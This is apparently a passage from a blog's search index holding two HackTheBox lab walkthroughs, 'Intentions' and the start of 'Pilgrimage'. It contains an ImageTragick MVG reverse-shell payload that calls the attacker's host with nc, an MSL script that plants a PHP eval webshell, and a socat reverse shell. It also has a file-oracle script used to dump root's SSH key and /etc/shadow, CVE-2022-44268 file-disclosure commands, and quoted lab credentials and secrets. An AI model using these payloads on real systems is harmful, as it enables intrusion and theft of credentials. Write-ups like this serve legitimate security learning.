Check out the file upload hint from the Legal Notice on the News section Re-enumerate the API, but this time check for POST and PUT. Special attention to /storage directory, as it seems like a likely place for Greg&rsquo;s photo-upload solution for the Legal team. photo upload is fine, because we can utilize ImageTragik php upload is even better, because that would be an easy webshell Investigate if the path mapping misconfiguration is present. If so, there is an LFI to try. Try traversing the mapping /storage &lt;&mdash; /var/www/html/intentions/storage/app/public Figure out how the image Edit feature works Maybe there&rsquo;s a way to use Imagick to read or write files FOOTHOLD Hoping for LFI Of the &ldquo;Ideas of what to look into&rdquo; from above, it seems easiest/fastest to check for the LFI, so I&rsquo;ll do that next. The hope is that the path is mapped like this:
location /storage { alias: /var/www/html/intentions/storage/app/public/; } &hellip;instead of the proper way like this:
location /storage/ { alias: /var/www/html/intentions/storage/app/public/; } To test this out, I tried navigating to this path:
http://10.10.11.220/storage../public/animals/dickens-lin-Nr7QqJIP8Do-unsplash.jpg &hellip;hoping that it would translate to this:
/var/www/html/intentions/storage/app/public/../public/animals/dickens-lin-Nr7QqJIP8Do-unsplash.jpg But unfortunately I was met with a 404 Not Found error.
Image Edit Feature How does the image edit feature even work? We know from the News section that it utilizes the PHP module Imagick. Immediately after opening my browser&rsquo;s dev tools window on the Edit feature, I noticed admin.js interacting with a part of the API that I hadn&rsquo;t yet seen:
GET /api/v2/admin/image/2 which unsurprisingly turns into a request to... GET /storage/animals/dickens-lin-Nr7QqJIP8Do-unsplash.jpg Whenever one of the buttons to apply an effect is clicked, a request like this is sent:
POST http://10.10.11.220/api/v2/admin/image/modify { &#34;path&#34;:&#34;/var/www/html/intentions/storage/app/public/animals/dickens-lin-tycqN7-MY1s-unsplash.jpg&#34;, &#34;effect&#34;:&#34;swirl&#34; } No new GET request is issued for a modified image. I checked to see how the image changes dynamically:
The response to the POST is a base64 encoded jpg. The src of the &lt;img&gt; is swapped-out every time a new effect is applied. I wonder if we can play with the &ldquo;path&rdquo; property to cause that POST to load a different image.
External Images To try this out, I copied the path of one of the architecture images from http://10.10.11.220/admin#/images. I then went into Edit feature of image 2 (the raccoon). Proxying the request through Burp, I selected the charcoal effect. For the &ldquo;path&rdquo; property in the POST data, I pasted the path (the file path, not the URL) to the architecture image:
Forwarding the request, I noticed it had the desired effect. That&rsquo;s no &lsquo;coon!
To push this idea further, I&rsquo;ll try hosting an image from my attacker machine, to see if external images can be loaded in this manner.
POST /api/v2/admin/image/modify HTTP/1.1 [all the usual headers] {&#34;path&#34;:&#34;http://10.10.14.2:8000/beaver.jpg&#34;,&#34;effect&#34;:&#34;nothing&#34;} It worked! Indeed that is still no &lsquo;coon!&rsquo; (note that Image 2 is the raccoon image)
Note that I used the property &quot;effect&quot; : &quot;nothing&quot;. I did also try this using the charcoal effect and it worked as well, but it was hard to tell that the image was a beaver so for this walkthrough I used an invalid effect instead.
Excellent. I&rsquo;ve caused the website to load and process an external resource. Since we know the server is using Imagick, there&rsquo;s a good chance we can use some kind of ImageTragick exploit to gain RCE, or at least an LFI.
ImageTragick Reverse Shell To try getting a reverse shell directly, I made an mvg file, revshell.mvg with the following contents:
push graphic-context viewbox 0 0 320 240 fill &#39;url(http://10.10.14.2:8000/beaver.jpg&#34;|mknod /tmp/pipez p;/bin/sh 0&lt;/tmp/pipez|nc 10.10.14.2 4444 1&gt;/tmp/pipez;rm -rf &#34;/tmp/pipez)&#39; pop graphic-context I then attempted to load the mvg file the same way that I loaded beaver.jpg. Unfortunately, the server rejected this format with status 422 Unprocessable Content.
Plant a PHP Webshell I also tried writing a web shell by following in the footsteps of this article. This is the request:
Then I tried making some requests to the webshell:
GET /storage/animals/shell.php?cmd=id Unfortunately, it looks like the php file was not written:
The author of that article seemed pretty confident that this method would work. And I did take quite a few liberties in modifying their PoC request into what I ultimately used&hellip; I&rsquo;ll try again, this time adhering more closely to the sample request:
Then I tried http://10.10.11.220/storage/animals/shell.php?cmd=id&hellip; still nothing.
I&rsquo;ll try moving the POST data up into URL parameters instead. They weren&rsquo;t present in the above request. Again, just making this closer and closer to the PoC request:
==&gt; Nope. That didn&rsquo;t work either.
What about attempting to write to /var/www/html/intentions/storage/app/public/shell.php instead (one directory up)? ==&gt; Nope. Same result: no file written.
What about attempting to write to /var/www/html/intentions/storage/app/shell.php instead (one directory up)? ==&gt; Nope. Same result: no file written.
Well, I&rsquo;m reading from /storage. Maybe write to /var/www/html/intentions/storage/shell.php instead (one directory up)? ==&gt; Nope. Same result: no file written.
This is getting tedious. Each attempt requires quite a bit of interaction with Burp and the browser. Also, I&rsquo;ve noticed that along the way I&rsquo;ve accidentally sent malformed requests (for example, accidentally set the Content-Type header twice to two different values, or failing to update the Content-Length). To streamline things a bit and make it less error-prone, I&rsquo;ll write a python script to attempt the same thing.
I tried all the same variations on this idea, but using Python Requests instead. Tried all the same write paths as above, tried modifying the msl payload as above, etc. I&rsquo;m happy to say that I eventually made it work. The script is available from my github repo if you want to try it out. The part of the script that plants the webshell is below:
msl_file = f&#39;&#39;&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt; &lt;image&gt; &lt;read filename=&#34;caption:&amp;lt;?php @eval(@$_REQUEST[&#39;cmd&#39;]); ?&amp;gt;&#34; /&gt; &lt;write filename=&#34;info:/var/www/html/intentions/storage/app/public/shell.php&#34; /&gt; &lt;/image&gt;&#39;&#39;&#39; def write_webshell(): # POST the msl with json moved to the request params. url = target_url + &#34;/api/v2/admin/image/modify&#34; url += &#34;?path=vid:msl:/tmp/php*&amp;effect=sepia&#34; files = {&#34;payload&#34;:(&#34;payload.msl&#34;, msl_file, &#39;text/plain&#39;)} response = s.post(url, files=files) print(f&#39;[{response.status_code}] {response.text}&#39;) Note that the session object, s is already authenticated as greg by the time that code runs. See the github repo for all the details on how that works.
USER FLAG User: www-data Using this webshell, I&rsquo;ll take a look around and see if there&rsquo;s a good way to get a better foothold. First I checked if I can access anyone&rsquo;s home directories: I cannot. Second, I started looking around the webserver /var/www/html for config files. Almost immediately, I found /var/www/html/intentions/docker-compose.yml, which revealed a few facts:
The webserver is using Laravel Laravel has an additional port mapped 5173:5173 There is a mariadb container on port 3306 The volume is mapped to /var/lib/mysql There is probably an initialization script at /var/www/html/intentions/vendor/laravel/sail/database/mysql/create-testing-database.sh:/docker-entrypoint-initdb.d/10-create-testing-database.sh healthcheck is defined as test: [&quot;CMD&quot;, &quot;mysqladmin&quot;, &quot;ping&quot;, &quot;-p\${DB_PASSWORD}&quot;] Since docker-compose.yml used lots of environment variables, I also checked for a .env file. There was one sitting adjacent to the docker compose file. Notable environment variables include:
APP_KEY=base64:YDGHFO792XTVdInb9gGESbGCyRDsAIRCkKoIMwkyHHI= DB_DATABASE=intentions DB_USERNAME=laravel DB_PASSWORD=02mDWOgsOga03G385!!3Plcx SESSION_LIFETIME=120 REDIS_HOST=redis REDIS_PASSWORD=null REDIS_PORT=6379 MAIL_MAILER=smtp MAIL_HOST=mailhog MAIL_PORT=1025 JWT_SECRET=yVH9RCGPMXyzNLoXrEsOl0klZi3MAxMHcMlRAnlobuSO8WNtLHStPiOUUgfmbwPt Great, found one credential: laravel : 02mDWOgsOga03G385!!3Plcx. It&rsquo;s probably just for the database.
Oh! so that&rsquo;s why my webshell dies so often: the session lifetime is set to 120! Better just make a reverse shell then.
Oh, there&rsquo;s socat? I&rsquo;ll use that then. On my attacker machine:
sudo ufw allow from 10.10.11.220 to any port 4444 proto tcp bash socat -d -d file:\`tty\`,raw,echo=0 TCP-LISTEN:4444 Then, on the target machine via the webshell:
socat TCP:10.10.14.2:4444 EXEC:&#39;bash&#39;,pty,stderr,setsid,sigint,sane Excellent. Now that I have a pretty good reverse shell, I&rsquo;ll take a look at that MariaDB database that had credentials in .env :
Databases, databases I checked out the intentions database. As expected, it was identical to the database dump already obtained via blind SQL injection (albeit a lot faster to enumerate). I also checked information_schema so see if the database could read or write files, etc. Unfortunately, no significant results.
With the obvious out of the way, I&rsquo;ll perform my typical User Enumeration (Linux) procedure. In the interest of keeping this walkthrough brief, I&rsquo;ll omit the procedure itself and just jot down any notable results:
www-data can sudo but I lack the password linpeas showed mention of another db: Pspy showed that there is a cleanup script running periodically Inside the .env file discovered earlier on, it mentions that they are using laravel.test. Hoping that they left some kind of testing logs, I looked inside the docker context directory: /var/www/html/intentions/vendor/laravel/sail/runtimes/8.2. Inside there is a script called start-container. The contents seem like maybe it could be used for privesc to root &#x1f6a9; I&rsquo;ll investigate this later.
History in .git The .git repo also looks interesting for this project. The file COMMIT_EDITMSG contains the following message:
Fix webpack for production Digging a little deeper, we see the commit history inside ./.git/logs/refs/heads/master:
I wonder, do they mean &ldquo;fixed webpack for production&rdquo; or that somebody should go fix webpack for the production branch? The webpack file looks normal. This is /var/www/html/intentions/webpack.mix.js:
/* |-------------------------------------------------------------------------- | Mix Asset Management |-------------------------------------------------------------------------- | | Mix provides a clean, fluent API for defining some Webpack build steps | for your Laravel application. By default, we are compiling the Sass | file for the application as well as bundling up all the JS files. | */ mix.js(&#39;resources/js/app.js&#39;, &#39;public/js&#39;).js(&#39;resources/js/login.js&#39;, &#39;public/js&#39;) .js(&#39;resources/js/gallery.js&#39;, &#39;public/js&#39;).js(&#39;resources/js/admin.js&#39;, &#39;public/js&#39;) .vue() .sass(&#39;resources/sass/app.scss&#39;, &#39;public/css&#39;); mix.js(&#39;resources/js/mdb.js&#39;, &#39;public/js&#39;); And what about the previous comment: &ldquo;Test cases did not work on steve&rsquo;s local database, switching to user factory per his advice&rdquo;?
Checking inside the /var/www/html/intentions/database directory shows that the current version of Intentions is indeed utilizing a user factory. I wonder what the old version of the code looked like. In an attempt to find out, I made a tar archive of the whole .git directory:
cd /tmp/Tools tar -czvf intentions.tar.gz -C /var/www/html/intentions/ . cp intentions.tar.gz /var/www/html/intentions/public/storage/ Then, on my attacker machine I navigated to http://10.10.11.220/storage/intentions.tar.gz to download the file. It was almost 150MB, so it took quite a while. After I downloaded it onto my attacker machine, I extracted the tar and examined the git repo using tig:
I didn&rsquo;t know what tig was until I saw it used in the demonstration video of another git examination tool called GitTools. tig looked like a pretty great way to read through a git repo to see its history and changes in a more human-readable format than git diff
I selected the commit highlighted in the above image. To my amazement, there were some goodies sitting there in plaintext:
(Apologies, the width of the page made it impossible to get a good screenshot. See next image as well)
&#x1f60e; We found a couple credentials:
greg@intentions.htb : Gr3g1sTh3B3stDev3l0per!1998! (this one is marked as admin) greg_user@intentions.htb : Gr3g1sTh3B3stDev3l0per!1998! Wonderful! Time to do a little dance and pray to the credential re-use gods&hellip; &#x1f64f;
&#x1f389; Success! The user flag is right there in /home/greg. Just cat it out for the glory. Note that greg&rsquo;s default shell is sh, so just switch to bash right away.
cat user.txt ROOT FLAG User Enumeration - greg Now that I&rsquo;m logged in through SSH, I&rsquo;ll enumerate greg. I&rsquo;ll follow my typical User Enumeration (Linux) strategy. To see the details of the strategy, read that page. For this walkthrough, I&rsquo;ll just discuss the notable results of enumeration:
greg cannot sudo at all find / -user greg 2&gt;/dev/null | grep -v '/proc' showed that greg has a ~/.mysql_history directory writable. Aso something strange in his keyring: /home/greg/.gnupg/crls.d (which was also one of the files modified in the last 5 minutes according to linpeas). Linpeas had a lot to say: As seen in linpeas, greg has two peculiar files in his home directory:
I get what this is about. This is so &ldquo;legal&rdquo; can check if any of the uploaded pictures match any known DMCA hashes - this way, they know if somebody uploaded a known-copyrighted image.
greg@intentions:~$ ll /opt/scanner/scanner -rwxr-x--- 1 root scanner 1.4M Jun 19 11:18 /opt/scanner/scanner Very interesting. If you run dmca_check.sh you get the output:
[+] DMCA-#1952 matches /home/legal/uploads/zac-porter-p_yotEbRA0A-unsplash.jpg But what type of hash is that? Naturally, it&rsquo;s impossible to isolate it to just one hash type, but some tools like hash-identifier can make an educated guess:
So it&rsquo;s probably the MD5 hash of an image. I figured I&rsquo;d check if zac-porter-p_yotEbRA0A-unsplash.jpg is listed in the MariaDB database. Unfortunately, it is not:
I wonder how these DMCA hashes compare to the flag, which itself has a similar format:
Identical format!
But maybe that doesn&rsquo;t even matter? I wonder if that scanner binary is able to read the root flag as the file to contain hashes, instead of dmca_hashes.test?
/opt/scanner/scanner -d /home/legal/uploads -h /root/root.txt Yeah, seems like it can. A little odd though, because the permissions on /opt/scanner/scanner do not indicate that it should be able to access a root file. However, with the capability cap_dac_read_search, it is able to bypass this check. This is starting to look like a fairly likely PE vector - I just need to figure out how to actually see the contents of the file (/root/root.txt), otherwise this capability is of no help for gaining the root flag.
Unusual Capabilities While exploring some options for leaking the root flag, scanner displayed its help text, showing that there are other flags that can be used:
I&rsquo;m not super knowledgable about the actual MD5 algorithm. I do know that it&rsquo;s a cyclical hash, calculated using block sizes of 512b (64B). I might try playing with this a bit. Here&rsquo;s some bash for generating hashes in the right format, generate_hashes.sh:
#!/bin/bash if [ -f fake_hashes.txt ]; then rm fake_hashes.txt fi for i in $(seq -f &#34;%04g&#34; 1 50); do hash=\`tr -dc a-f0-9 &lt; /dev/urandom | dd bs=32 count=1 2&gt; /dev/null\` echo &#34;DMCA-#$i:$hash&#34; &gt;&gt; fake_hashes.txt; done Trying a few things with /opt/scanner/scanner, it seems like the program doesn&rsquo;t care at all if it actually reads an image or not. It&rsquo;s perfectly happy to take a hash of a text file or anything else.
&#x1f6a8; So here&rsquo;s my big idea: we can generate an &ldquo;image&rdquo; for scanner to read, thus controlling the hash it produces. Using the -l flag seen in the above screenshot, we can take a hash of only a small portion of the file. We could also take a hash of an equally small portion of the root flag, due to the binary&rsquo;s capability. I could also use the -p flag to easily get the hash of a file read using scanner (a file owned by root). Consider how this would go, starting with just a single byte, but then growing that length all the way up to 32 bytes:
If the hash of the first byte of the flag (using the flag as the &lsquo;image&rsquo;) matches the hash of the first byte of a sequence of values ranging from 0 to 255, then we just found the first character of the flag. Repeat this process for lengths all the way up to 32 to obtain the whole flag.
This is a variation on the known-plaintext attack. We control one hash: by checking equality of the controlled hash against the target hash, we can check (with a high degree of likelihood) if the pre-images are the same too.
It took some time, but I iteratively built this idea into a python script. In short, I capture a &ldquo;reference&rdquo; hash from the root flag, and then compare that to a hash calculated from a file I just wrote - written by iterating byte values. When the hashes are equal, we record the latest byte value and extend the length of the hash comparison. Here&rsquo;s the important part:
found_bytes = [] for length in range(1,max_length+1): reference_hash = get_target_hash(length) for byte_value in charset: write_test_image(found_bytes, byte_value) if (compare_image_hash(reference_hash, length)): found_bytes.append(byte_value) print(bytes(found_bytes).decode(&#39;utf-8&#39;), end=&#39;\\r&#39;) break print(&#39;\\n&#39;) For the full script, please see the github repo where I posted it. It also contains usage instructions. Enjoy.
The fastest thing to do to get the points on this box is to use my tool to dump the contents of the flag file directly. To do that, download the script onto the target box by whatever means (I used a python webserver hosted from my attacker machine) then run the following:
./known-plaintext.py /root/root.txt 32 --hex &#x1f389; You should have the flag in a second or two.
EXTRA CREDIT: PWN Now that I have a script that can dump any text-based file on the box. Why not poke around and see if there&rsquo;s a private key? And as a backup plan, I could always just dump /etc/shadow and crack the password hashes. First, I checked the usual spot for an SSH private key:
./known-plaintext.py /root/.ssh/id_rsa 10 Looks like it&rsquo;s reading something! there must be a private key there. How lucky &#x1f340;
To get the whole SSH key, I set a much larger expected file size:
I checked some SSH private keys that I had locally using, and they were all less than 6000 characters long. To do this, I ran find /home/kali -name id_rsa -exec wc -c {} + ./known-plaintext.py /root/.ssh/id_rsa 6000 It took some time, but the script began dumping the file contents. So happy it works! All in all, it took about ten minutes to run.
I copy-pasted the dumped SSH private key to my attacker machine, then tried connecting using the key:
ssh -i id_rsa root@10.10.11.220 But unfortunately I was getting an error:
Load key &#34;id_rsa&#34;: error in libcrypto The cause must be a malformed key. Upon looking into it, I discovered that I accidentally filled it with whitespace. Probably because I copy-pasted it directly from tmux onto my attacker machine in vim. I&rsquo;ll trim out the horizontal whitespace:
cat id_rsa | tr -d &#34;[:blank:]&#34; &gt; id_rsa_trimmed Checking the file, it looks like that accidentally removed spaces from the first and last lines&hellip; Adjust them back to this:
-----BEGIN OPENSSH PRIVATE KEY----- ... -----END OPENSSH PRIVATE KEY----- Then change the permissions on the private key:
chmod 700 id_rsa_trimmed Finally, I&rsquo;ll attempt again to connect using SSH:
ssh -i id_rsa_trimmed root@10.10.11.220 &#x1f389; Finally! Rooted it. What a rush!
Taking a peek around, I get to finally read those scripts that I saw in pspy:
Just for funsies, I also grabbed /etc/shadow and took a copy locally. I might try cracking those later. I was having trouble identifying the hashes using hashid and hash-identifier, so I tried a newer tool called Name-that-hash and it worked very well:
Anyone interested in identifying hashes with better accuracy and context should check out their repo.
LESSONS LEARNED Attacker On a box as hard as this one, you can&rsquo;t over-enumerate for foothold. Ffuf is extremely powerful and easy for doing highly specific directory enumeration. In this case, enumerating every portion of the APIs turned out to be very beneficial. While other players may have discovered the v2 API by carefully examining the .js files, at least two of those .js files were only found during second, specific enumeration of just the /js directory. Spend a lot of time thinking about how the server might work, such as what the backend code might look like. Think about how you would make a similar tool if you were using the same languages or modules. The clearer mental picture you can make for yourself, the less time you will spend searching around the internet for existing exploits, PoCs, and other security research in general. It will help you realize when you found the right thing, so you can go down fewer wrong paths. If you&rsquo;ve done a burp proxy more than a dozen times, it&rsquo;s probably better just to write a script. Multiple attempts at an exploit that involves a lot of clicking, typing, or interaction will almost always introduce some accidents/errors into your process. By scripting the exploit, you can eliminate many of these kinds of errors and keep your development moving in the right direction. Git can be your best friend. Keep a toolbox full of git analysis tools. They can be used rapidly and many specialized tools can do exactly what you need with very little effort. For example, there are secret-extraction tools that go looking for leaked credentials: I didn&rsquo;t even need to examine the history using tig. Always check &ldquo;custom&rdquo; code first - like the /opt/scanner/scanner binary. Coding is hard: it can be tough for developers to avoid introducing logic errors or loopholes into software. In this case, less capabilities but also some validation of user input would have been quite handy; why not write scanner to check that the provided file is actually an image? Defender Keep as much code as possible client-side. Not only does it offload processing onto the clients, it can be much more secure. If Intentions didn&rsquo;t use server-side image transformations (using Imagick), then there would have been no vulnerability. The image effects are only relevant to a single user observing the image, so why not just use some client-side JS to make it happen? Use HTTPS. How am I even writing this in 2023?! Anyone and their dog can go get a free SSL certificate in a matter of minutes. There is simply no excuse. Using HTTPS would have added an extra (fairly thick) layer of security to the authentication process, preventing the passing-the-hash entry. Least-privilege (or least capability) is still a relevant principle. There was no way that I could have achieved root access to the system without a binary with more-than-necessary capabilities. While I understand why greg wanted an easy way for Legal to check DMCA-hashes, this would have been a more secure and clean setup if they had simply put greg and legal in a group together and had a writable shared directory for that group. Think carefully about the security of docker-compose and .env files. Avoid situations where, if one small part is attacked successfully, the whole system becomes compromised. Keep secrets out of git. Thankfully, other git tools like Github have started checking-for and preventing users from accidentally committing secrets into a repo. However, these safeguards are absent when using local .git repos to track a project. Even simple mechanisms like .gitignore can be useful for this. `,url:"https://4wayhandshake.github.io/walkthrough/intentions/"},"https://4wayhandshake.github.io/walkthrough/pilgrimage/":{title:"Pilgrimage",tags:["CVE","ImageTragick","File Disclosure","Git","Binwalk","Malicious Plugin"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION At the time of writing this walkthrough, Pilgrimage is still an Active box. It was released as the second box for HTB&rsquo;s Hackers Clash: Open Beta Season II. The box features a webserver, hosting an application that shrinks images uploaded by the user, halving both the width and height of the image.
RECON For this box, I&rsquo;m running the same enumeration strategy as the previous box, Sandworm. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to my target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 5000 -oN nmap/port-scan.txt $RADDR The results showed only ports 22 (SSH), and 80 (HTTP):
Nmap scan report for pilgrimage.htb (10.10.11.219) Host is up (0.15s latency). Not shown: 65392 closed tcp ports (reset), 141 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http I followed up with a more detailed script scan that would include the above ports:
nmap -sV -sC -n -Pn --top-ports 2000 -oN nmap/init-scan.txt $RADDR The results show a typical webserver running on port 80:
Host is up (0.22s latency). Not shown: 1998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 20be60d295f628c1b7e9e81706f168f3 (RSA) | 256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA) |_ 256 d14e293c708669b4d72cc80b486e9804 (ED25519) 80/tcp open http nginx 1.18.0 |_http-server-header: nginx/1.18.0 |_http-title: Did not follow redirect to http://pilgrimage.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Webserver Strategy Did banner-grabbing, noticed that port 80 is redirecting to http://pilgrimage.htb. Also, server is using nginx 1.18.0:
whatweb $RADDR &amp;&amp; curl -IL http://$RADDR Added pilgrimage.htb to /etc/hosts and proceeded with vhost enumeration, subdomain enumeration, and directory enumeration.
echo &#34;10.10.11.219 pilgrimage.htb&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost.md -of md -timeout 4 -ic -ac ffuf -w $WLIST -u http://FUZZ.$DOMAIN/ -c -t 60 -o fuzzing/subdomain.md -of md -timeout 4 -ic -ac No results from vhost or subdomain enumeration, so I proceeded with directory enumeration on http://pilgrimage.htb:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt&#34; feroxbuster -w $WLIST -u http://$DOMAIN -A -d 1 -t 100 -T 4 -f --auto-tune --collect-words --filter-status 400,401,402,403,404,405 --output fuzzing/directory.json -E Directory enumeration gave the following:
Exploring the Website I took a look through the website; tried the image shrinking feature. I don&rsquo;t know. Did it work?
Still cute. But is it smaller?
file beaver.jpeg beaver.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, Exif Standard: [TIFF image data, little-endian, direntries=2, software=Google], baseline, precision 8, 900x900, components 3 compared to the shrunk version &hellip;
file 64975a1f2882a\\ smaller.jpeg 64975a1f2882a smaller.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, Exif Standard: [TIFF image data, little-endian, direntries=2, software=Google], baseline, precision 8, 450x450, components 3 ll | grep beaver ; ll | grep 64975 -rw-r--r-- 1 kali kali 88952 Jun 16 02:07 beaver.jpeg -rw-r--r-- 1 kali kali 56836 Jun 25 00:03 64975a1f2882a smaller.jpeg Indeed, it is smaller.
🤔 Given that it halved both the width and height, you&rsquo;d think that it&rsquo;d cut the file size down to a quarter of the original size - which it clearly did not. Seems odd.
Let&rsquo;s keep exploring the site a bit. There&rsquo;s a login page at http://pilgrimage.htb/login.php. I&rsquo;ll try some obvious credentials like admin : admin just to check for low-hanging fruit, as they say.
Unfortunately, none worked. What about some SQL auth bypass?
Nope. That didn&rsquo;t work either. No worries, I&rsquo;ll just try making an account using http://pilgrimage.htb/register.php for now and log in with that. I created an account with credential jimbo : password and proceeded to the dashboard. As expected, there were no entries.
I tried shrinking a couple more images (logged in this time) and, as expected, the images were listed under /dashboard.php.
FOOTHOLD File Disclosures It&rsquo;s likely that this service is utilizing a program called ImageMagick, which can be used for things like resizing and compressing images. Personally, I use it quite often via the program convert for resizing hi-res images down to something I can post on the web. I&rsquo;ve ran into a few web challenges (and one HTB box) before where the exploit to gain a foothold was something to do with abusing ImageMagick. For context, ImageMagick was the subject of a whole family of CVEs back in 2016 called ImageTragick. I checked PayloadAllTheThings and found that there was a new incarnation of ImageTragic: CVE-2022-44268 shown here. Maybe I&rsquo;ll give that a go?
First, I installed pngcrush and its deps. I downloaded a random png file, saving it as exploit.png. Then, I tried the provided command:
pngcrush -text a &#34;profile&#34; &#34;/etc/passwd&#34; exploit.png Unfortunately that didn&rsquo;t work, but I&rsquo;ll keep trying. I did some more searching on CVE-2022-44268, and found a YouTube video demonstrating a PoC of its exploitation on a Vulnmachines box. There was was some PoC code to go along with the Vulnmachines box, so I tried downloading and using that.
I ran the code as follows, first getting the poc.py to generate an image exploit.py:
chmod u+x poc.py python3 poc.py -o exploit.png -r /etc/passwd generate This image should contain an exploit to disclose /etc/passwd when processed by ImageMagick. I tried uploading it to have it resized. Much to my surprise, the server accepted and processed the image:
Then I downloaded the &lsquo;converted&rsquo; image, saving as out.png, and ran it through the same PoC code to parse the output:
python3 poc.py -i out.png parse Success! Now I just need to figure out how I can harness this best 🤔
But first, that got me wondering, why did one attempt at CVE-2022-44268 work while another didn&rsquo;t? I&rsquo;ll try the one from PayloadAllTheThings again and see if I messed up something obvious&hellip;
First, I&rsquo;ll use pngcrush to embed a file read into an existing png file, exploit.png:
pngcrush -text a &#34;profile&#34; &#34;/etc/hosts&#34; exploit.png OH! facepalm I had not read the output carefully enough 😱. This command generated a new file called pngout.png:
Then I uploaded the file pngout.png to the website for conversion, converted it successfully, then downloaded the file as pngout-out.png. I read the file using identify:
identify -verbose pngout-out.png This showed quite a lot of text, including a big block of hex somewhere near the bottom. I quickly copied this to a text editor, removed the line breaks, and read the hex using python (as suggested on PayloadAllTheThings):
python3 -c &#39;print(bytes.fromhex(&#34;3132372e302e302e31096c6f63616c686f73740a3132372e302e312e310970696c6772696d6167652070696c6772696d6167652e6874620a0a232054686520666f6c6c6f77696e67206c696e65732061726520646573697261626c6520666f7220495076362063617061626c6520686f7374730a3a3a3120202020206c6f63616c686f7374206970362d6c6f63616c686f7374206970362d6c6f6f706261636b0a666630323a3a31206970362d616c6c6e6f6465730a666630323a3a32206970362d616c6c726f75746572730a&#34;).decode(&#34;utf-8&#34;))&#39; The result was indeed the target&rsquo;s /etc/hosts file:
Ok, good to know it was just a silly mistake. Still unclear how I&rsquo;ll use this to gain RCE though.
I figured it was probably a good idea to take a look at the .php files that comprise the website, such as index.php, dashboard.php, and login.php. However, I seem to be unable to read any of those files using either exploit for CVE-2022-44268. It seems like maybe the exploits require an absolute filepath. I tried all kinds of filepaths, none of which worked. Attempts included the following:
/var/www/index.php /var/www/html/index.php /var/www/pilgrimage/index.php /var/www/html/pilgrimage/index.php /var/www/pilgrimage/html/index.php Perhaps I&rsquo;ll check for an .htpasswd file and leak some credentials or hashes. Since the user is www-data, this might be using apache, in which case the htpasswd file will be at /etc/apache2/.htpasswd
Nope, no luck. After parsing, the data came back empty. But maybe there&rsquo;s something to this: searching for a file marked hidden in the directory structure. I&rsquo;ll go back to directory enumeration, this time looking for hidden directories:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://pilgrimage.htb/.FUZZ -t 80 --recursion --recursion-depth 2 -c -timeout 4 -fc 403 ☝️ I&rsquo;ve found that ffuf is the best at rapidly enumerating exactly what you want. It doesn&rsquo;t try to interpret things like a dot in the url. It just does exactly what it&rsquo;s supposed to do: substitute values in a wordlist for the FUZZ parameter.
Within seconds, fuff showed that I had failed to enumerate a .git directory! Also, it showed three URLs giving an HTTP 200 status:
/.git/index /.git/config /.git/description GitHacker I tried navigating to each of the above files discovered with ffuf. A GET request to each URL yielded a download of the corresponding git file. The files config and description were both uninteresting, but index had quite a bit of garbled text in it (just like a typical .git/index file). It would be a lot better if I could simply view the git repo in its entirety instead of relying on bits and pieces. Thankfully, exactly that tool exists already: GitHacker.
At first, I tried running the tool as a docker container. However, this kept reporting some kind of &ldquo;name failed to resolve&rdquo; error, even though the name I was providing it resolved just fine. After a bit of banging my head against the wall with the docker container, I instead installed the tool using pip and it worked right away!
githacker --url http://pilgrimage.htb/.git/ --output-folder result That worked like a charm! I took a look through the source code, especially index.php and dashboard.php.
It looks like the application is interacting with an sqlite database at /var/db/pilgrimage. To take a look through this database, I&rsquo;ll try getting the file using the same exploit:
pngcrush -text a &#34;profile&#34; &#34;/var/db/pilgrimage&#34; exploit.png I uploaded the file, downloaded the result, and parsed it (all the same as before):
identify -verbose pngout-out.png This is great, but it&rsquo;s over 500 lines long. I copy-pasted the big block of hex into a file db-dump-lines. I don&rsquo;t want to have to strip off the line endings manually, so maybe I&rsquo;ll try parsing it with python?
Now&hellip; this definitely isn&rsquo;t the prettiest python I&rsquo;ve ever written 😅 but at least it didn&rsquo;t take long to scrap together (definitely shorter than manually trimming off all those line endings):
#!/usr/bin/python3 import binascii fp = &#34;db-dump-lines&#34; writefile = &#34;dumped-text&#34; def readContents(filepath): with open(filepath, &#39;rb&#39;) as readfile: txt = b&#39;&#39; while True: line = readfile.read() if not line: break lines = line.strip().split(b&#39;\\n&#39;) for l in lines: txt += l return txt def writeContents(contents, writefilepath): with open(writefilepath, &#39;wb&#39;) as writefile: writefile.write(contents) t = readContents(fp) decoded = t.decode(&#34;utf-8&#34;) fromhex = bytes.fromhex(decoded).replace(b&#39;\\x00&#39;, b&#39; &#39;) print(fromhex) writeContents(fromhex, writefile) print(&#34;Done.&#34;) The result is the text that would have been in the sqlite database that the web app interacts with. Right away, we see a pair of credentials: the jimbo : password credential I used when uploading the exploit png, and another one too
There we go! a new credential: emily : abigchonkyboi123
USER FLAG Just Read It I remember seeing emily was one of the regular / human users from /etc/passwd, so I&rsquo;m very hopeful about credential re-use. Let&rsquo;s try plugging this credential into SSH 🤞
🎉 Alright! Finally, a shell!
This SSH connection drops us right into /home/emily. Go ahead and cat out the user flag:
cat user.txt ROOT FLAG User Enumeration - Emily Having just gained access to a new user, it is probably a good idea to fully enumerate the user. I&rsquo;ll follow my typical strategy, User Enumeration (Linux). However, to save from cluttering up this walkthrough with unnecessary details, I&rsquo;ll avoid talking about the enumeration procedure, and instead just show the notable results.
